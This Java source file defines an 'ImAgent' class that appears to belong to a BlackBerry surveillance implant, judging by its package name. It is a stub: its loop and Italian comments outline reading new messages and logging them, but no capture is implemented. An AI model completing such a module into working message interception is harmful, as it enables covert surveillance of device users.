package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class ImAgent extends Agent {
	//#debug
    static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);

    private int timeToSleep = 1000;

    public ImAgent(boolean agentStatus) {
        super(Agent.AGENT_IM, agentStatus, true);
    }

    protected ImAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        // #debug
        debug.trace("run");

        int loop = 0;

        for (;;) {
            // #debug
            debug.trace("loop:" + loop);
            ++loop;

            // verifica che ci siano email *nuove* da leggere

            // per ogni email da leggere

            // genera un log con la email

            if (smartSleep(timeToSleep)) {
                // #debug
                debug.trace(loop + " clean stop");
                return;
            }
        }
    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
